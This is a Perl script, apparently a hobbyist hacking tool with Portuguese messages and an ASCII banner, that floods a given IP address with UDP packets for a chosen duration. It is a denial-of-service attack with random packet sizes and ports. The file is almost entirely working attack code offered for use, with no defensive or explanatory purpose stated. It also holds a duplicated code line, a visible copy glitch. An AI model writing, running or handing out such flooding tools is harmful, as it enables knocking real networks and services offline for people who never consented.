#!/usr/bin/perl
 
##
# Naoxy's Script
##
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Esse ip não funciona amigão $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print <<EOTEXT;
      ::::    :::           :::        ::::::::       :::    :::    :::   ::: 
     :+:+:   :+:         :+: :+:     :+:    :+:      :+:    :+:    :+:   :+:  
    :+:+:+  +:+        +:+   +:+    +:+    +:+       +:+  +:+      +:+ +:+    
   +#+ +:+ +#+       +#++:++#++:   +#+    +:+        +#++:+        +#++:      
  +#+  +#+#+#       +#+     +#+   +#+    +#+       +#+  +#+        +#+        
 #+#   #+#+#       #+#     #+#   #+#    #+#      #+#    #+#       #+#         
###    ####       ###     ###    ########       ###    ###       ###          
EOTEXT
 
 print           "                               Dr0WeD $ip
                        On port " .
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Derruba o lixo. ") . "\n";
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Derruba o lixo. ") . "\n";
        print "parar DoSing com Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
